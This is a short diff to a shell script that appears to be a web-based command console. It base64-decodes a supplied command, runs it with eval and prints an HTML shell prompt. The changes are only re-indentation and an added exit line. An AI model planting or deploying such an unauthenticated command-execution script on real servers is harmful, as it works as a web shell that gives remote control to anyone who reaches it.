@@ -15,7 +15,7 @@ c=$(echo $cmd|base64 -d)
 [ -z "$c" ] && echo "No command!" && exit
 
 prompt() {
-  echo -e "<b>[$(whoami)@$(hostname) $PWD]# ${1}</b>"
+	echo -e "<b>[$(whoami)@$(hostname) $PWD]# ${1}</b>"
 }
 
 export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin
@@ -25,16 +25,18 @@ eval $c 2>&1
 
 case "$?" in
 126)
-  echo "-sh: $c: Permission denied"
-  prompt
-  ;;
+	echo "-sh: $c: Permission denied"
+	prompt
+	;;
 127)
-  echo "-sh: $c: not found"
-  prompt
-  ;;
+	echo "-sh: $c: not found"
+	prompt
+	;;
 0)
-  prompt
-  ;;
+	prompt
+	;;
 *)
-  echo -e "\nEXIT CODE: $?"
+	echo -e "\nEXIT CODE: $?"
 esac
+
+exit 0
